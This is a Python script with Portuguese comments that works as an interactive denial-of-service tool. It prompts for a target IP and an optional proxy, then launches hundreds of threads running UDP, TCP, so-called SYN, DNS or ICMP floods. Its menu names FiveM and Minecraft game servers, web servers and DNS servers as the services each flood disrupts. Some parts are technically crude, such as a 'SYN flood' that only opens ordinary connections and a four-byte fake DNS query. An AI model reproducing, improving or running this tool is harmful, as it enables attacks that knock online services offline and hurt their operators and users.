import socket
import threading
import psutil
import logging
import re
import time
import random

# Configuração de logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Banner em ASCII
banner = r"""
   *                              
 (  `                             
 )\))(      (   (  (     )        
((_)()\  (  )(  )\))( ( /(  (     
(_()((_) )\(()\((_))\ )(_)) )\ )  
|  \/  |((_)((_)(()(_|(_)_ _(_/(  
| |\/| / _ \ '_/ _` |/ _` | ' \)) 
|_|  |_\___/_| \__, |\__,_|_||_|  
               |___/              
"""
print(banner)

# Função para validar o IP
def is_valid_ip(ip):
    pattern = re.compile(r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$")
    return pattern.match(ip) is not None

# Função para ataque UDP Flood com suporte a proxy
def udp_flood(ip, port, rate_limit, proxy=None):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes_to_send = random._urandom(1024)  # Gerar um pacote aleatório de 1024 bytes
    while True:
        if proxy:
            logging.warning("Proxy não suportado para UDP Flood")
            break
        sock.sendto(bytes_to_send, (ip, port))
        logging.info(f"Pacote UDP enviado para {ip}:{port}")
        time.sleep(rate_limit)

# Função para ataque TCP Flood com suporte a proxy
def tcp_flood(ip, port, rate_limit, proxy=None):
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            if proxy:
                proxy_ip, proxy_port = proxy.split(":")
                sock.connect((proxy_ip, int(proxy_port)))
                sock.send(f"CONNECT {ip}:{port} HTTP/1.1\r\n\r\n".encode())
            else:
                sock.connect((ip, port))
            
            logging.info(f"Conectado ao {ip}:{port} - Enviando pacotes TCP.")
            sock.send(b'GET / HTTP/1.1\r\n')  # Enviando um pacote simples
            sock.close()
            time.sleep(rate_limit)
        except socket.error as e:
            logging.error(f"Erro ao enviar pacote TCP: {e}")

# Função para ataque TCP SYN Flood com suporte a proxy
def tcp_syn_flood(ip, port, rate_limit, proxy=None):
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            if proxy:
                proxy_ip, proxy_port = proxy.split(":")
                sock.connect((proxy_ip, int(proxy_port)))
                sock.send(f"CONNECT {ip}:{port} HTTP/1.1\r\n\r\n".encode())
            else:
                sock.connect((ip, port))
            
            logging.info(f"SYN enviado para {ip}:{port} via proxy {proxy if proxy else 'direto'}")
            sock.close()
            time.sleep(rate_limit)
        except socket.error as e:
            logging.error(f"Erro ao enviar SYN: {e}")

# Função para ataque DNS Flood com suporte a proxy
def dns_flood(ip, port, rate_limit, proxy=None):
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            dns_query = b'\x12\x34\x56\x78'  # Simulando uma consulta DNS
            sock.sendto(dns_query, (ip, port))
            logging.info(f"Consulta DNS enviada para {ip}:{port} via proxy {proxy if proxy else 'direto'}")
            time.sleep(rate_limit)
        except socket.error as e:
            logging.error(f"Erro ao enviar consulta DNS: {e}")

# Função para ataque ICMP Flood com suporte a proxy
def icmp_flood(ip, rate_limit, proxy=None):
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            sock.sendto(b'\x08\x00\x00\x00', (ip, 0))  # Enviando um pacote ICMP Echo Request
            logging.info(f"Pacote ICMP enviado para {ip} via proxy {proxy if proxy else 'direto'}")
            time.sleep(rate_limit)
        except socket.error as e:
            logging.error(f"Erro ao enviar pacote ICMP: {e}")

# Função para determinar o número ideal de threads
def get_optimal_thread_count():
    cpu_cores = psutil.cpu_count(logical=True)
    ram = psutil.virtual_memory().available // (1024 * 1024)  # em MB
    max_threads = cpu_cores * 100  # Por exemplo, 100 threads por núcleo
    if ram < 2048:  # Menos de 2GB de RAM
        max_threads = min(max_threads, 200)  # Limitar a 200 threads
    elif ram < 4096:  # Menos de 4GB de RAM
        max_threads = min(max_threads, 500)  # Limitar a 500 threads
    return max_threads

# Função principal para criar múltiplas threads
def main():
    # Solicita ao usuário o IP (com validação)
    while True:
        target_ip = input("Digite o IP alvo: ")
        if is_valid_ip(target_ip):
            logging.info("IP válido.")
            break
        else:
            print("Por favor, insira um IP válido.")

    # Solicitar proxy, se desejado
    proxy_input = input("Deseja usar um proxy? Se sim, insira no formato IP:Porta (ou pressione Enter para não usar): ")
    proxy = proxy_input.strip() if proxy_input else None

    while True:
        print("\nEscolha o tipo de ataque:")
        print("1. UDP Flood (Impacta servidores de jogos online como FiveM e outros que usam UDP)")
        print("2. TCP Flood (Impacta servidores Minecraft e outros serviços que usam TCP)")
        print("3. TCP SYN Flood (Explora o handshake TCP, afetando servidores web e serviços de rede)")
        print("4. DNS Flood (Impacta servidores DNS, podendo causar falhas na resolução de nomes)")
        print("5. ICMP Flood (Ping Flood - saturação através de pacotes ICMP, afeta a disponibilidade geral)")
        print("6. Sair")
        
        choice = input("Digite o número do ataque desejado: ")
        
        if choice in ["1", "2", "3", "4", "5"]:
            rate_limit = float(input("Digite o intervalo em segundos entre pacotes (ex: 0.1 para 100ms): ") or 0.1)
            recommended_threads = get_optimal_thread_count()
            user_threads = input(f"Digite o número de threads que deseja (ou pressione Enter para usar {recommended_threads}): ")
            num_threads = recommended_threads if not user_threads.strip() else int(user_threads)
            
            for _ in range(num_threads):
                if choice == "1":
                    thread = threading.Thread(target=udp_flood, args=(target_ip, 30120, rate_limit, proxy))
                elif choice == "2":
                    thread = threading.Thread(target=tcp_flood, args=(target_ip, 25565, rate_limit, proxy))
                elif choice == "3":
                    thread = threading.Thread(target=tcp_syn_flood, args=(target_ip, 80, rate_limit, proxy))
                elif choice == "4":
                    thread = threading.Thread(target=dns_flood, args=(target_ip, 53, rate_limit, proxy))
                elif choice == "5":
                    thread = threading.Thread(target=icmp_flood, args=(target_ip, rate_limit, proxy))
                thread.start()
        
        elif choice == "6":
            logging.info("Saindo do script.")
            break
        else:
            logging.error("Escolha inválida.")

if __name__ == "__main__":
    main()
